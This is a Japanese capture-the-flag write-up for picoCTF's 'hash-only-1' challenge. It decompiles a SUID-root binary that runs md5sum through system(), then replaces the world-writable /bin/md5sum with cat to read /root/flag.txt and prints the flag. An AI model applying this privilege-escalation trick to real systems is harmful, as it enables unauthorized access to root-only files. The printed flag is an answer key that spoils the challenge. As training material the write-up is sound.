#### hash-only-1（100 points）

SSH でサーバにログインできるようです。また、サーバからプログラムバイナリをダウンロードする方法も提示されています。

<figure class="figure-image figure-image-fotolife" title="hash-only-1（100 points）">[f:id:daisuke20240310:20250315191543p:plain:alt=hash-only-1（100 points）]<figcaption>hash-only-1（100 points）</figcaption></figure>

SCP でプログラムバイナリをダウンロードしてみます。

```sh
$ scp -P 62827 ctf-player@shape-facility.picoctf.net:~/flaghasher .
ctf-player@shape-facility.picoctf.net's password: 
flaghasher                                                                                                                                                                                                                 100%   18KB  34.7KB/s   00:00    
```

SSH で接続してみます。接続できて、カレントディレクトリを表示しました。対象のファイルの flaghasher に、SUID がセットされています。

```sh
$ ssh ctf-player@shape-facility.picoctf.net -p 62827
The authenticity of host '[shape-facility.picoctf.net]:62827 ([3.20.150.139]:62827)' can't be established.
ED25519 key fingerprint is SHA256:Fz1mMdx0yh6mS5b8KQR1ZtlFCzBFhRSUtFBKf8iBV8g.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[shape-facility.picoctf.net]:62827' (ED25519) to the list of known hosts.
ctf-player@shape-facility.picoctf.net's password:
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 6.8.0-1023-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

ctf-player@pico-chall$ ls -alF
total 24
drwxr-xr-x 1 ctf-player ctf-player    20 Mar 15 11:05 ./
drwxr-xr-x 1 root       root          24 Mar  6 03:44 ../
drwx------ 2 ctf-player ctf-player    34 Mar 15 11:05 .cache/
-rw-r--r-- 1 root       root          67 Mar  6 03:45 .profile
-rwsr-xr-x 1 root       root       18312 Mar  6 03:45 flaghasher*
```

ローカル、サーバの順に実行してみます。ローカルでは、/root/flag.txt の位置にファイルを置いてないため、エラーになりました。サーバの方は、MD5 のハッシュを計算してくれて、その結果を表示してくれました。権限昇格の問題でしょうか。

```sh
$ ./flaghasher 
Computing the MD5 hash of /root/flag.txt.... 

md5sum: /root/flag.txt: そのようなファイルやディレクトリはありません
Error: system() call returned non-zero value: 256

ctf-player@pico-chall$ ./flaghasher
Computing the MD5 hash of /root/flag.txt....

87372b3f21242178d2bf22192541ab0c  /root/flag.txt
```

権限昇格の問題なら必要なさそうですが、一応、Ghidra で見てみます。main関数です。

```c
bool main(void)
{
  basic_ostream *pbVar1;
  basic_ostream<> *pbVar2;
  char *__command;
  long in_FS_OFFSET;
  bool bVar3;
  allocator<char> local_4d;
  int local_4c;
  basic_string<> local_48 [40];
  long local_20;
  
  local_20 = *(long *)(in_FS_OFFSET + 0x28);
  pbVar1 = std::operator<<((basic_ostream *)std::cout,
                           "Computing the MD5 hash of /root/flag.txt.... ");
  pbVar2 = (basic_ostream<> *)
           std::basic_ostream<>::operator<<((basic_ostream<> *)pbVar1,std::endl<>);
  std::basic_ostream<>::operator<<(pbVar2,std::endl<>);
  sleep(2);
  std::allocator<char>::allocator();
                    /* try { // try from 001013aa to 001013ae has its CatchHandler @ 0010144f */
                    /* } // end try from 001013aa to 001013ae */
  std::__cxx11::basic_string<>::basic_string
            ((char *)local_48,(allocator *)"/bin/bash -c \'md5sum /root/flag.txt\'");
  std::allocator<char>::~allocator(&local_4d);
  setgid(0);
  setuid(0);
  __command = (char *)std::__cxx11::basic_string<>::c_str();
                    /* try { // try from 001013de to 00101423 has its CatchHandler @ 0010146d */
  local_4c = system(__command);
  bVar3 = local_4c != 0;
  if (bVar3) {
    pbVar1 = std::operator<<((basic_ostream *)std::cerr,
                             "Error: system() call returned non-zero value: ");
    pbVar2 = (basic_ostream<> *)std::basic_ostream<>::operator<<((basic_ostream<> *)pbVar1,local_4c)
    ;
                    /* } // end try from 001013de to 00101423 */
    std::basic_ostream<>::operator<<(pbVar2,std::endl<>);
  }
  std::__cxx11::basic_string<>::~basic_string(local_48);
  if (local_20 == *(long *)(in_FS_OFFSET + 0x28)) {
    return bVar3;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

なんとなく分かりました。md5sum を置き換えてしまえばいいと思います。やってみます。

フラグが表示されました。

```sh
ctf-player@pico-chall$ ls -alF /bin/md5sum
-rwxrwxrwx 1 root root 47480 Sep  5  2019 /bin/md5sum*

ctf-player@pico-chall$ ln -s /bin/cat md5sum

ctf-player@pico-chall$ ls -alF
total 24
drwxr-xr-x 1 ctf-player ctf-player    34 Mar 15 11:47 ./
drwxr-xr-x 1 root       root          24 Mar  6 03:44 ../
drwx------ 2 ctf-player ctf-player    34 Mar 15 11:46 .cache/
-rw-r--r-- 1 root       root          67 Mar  6 03:45 .profile
-rwsr-xr-x 1 root       root       18312 Mar  6 03:45 flaghasher*
lrwxrwxrwx 1 ctf-player ctf-player     8 Mar 15 11:47 md5sum -> /bin/cat*

ctf-player@pico-chall$ cp md5sum /bin/

ctf-player@pico-chall$ ./flaghasher
Computing the MD5 hash of /root/flag.txt....

picoCTF{sy5teM_b!n@riEs_4r3_5c@red_0f_yoU_e85aba2d}
```

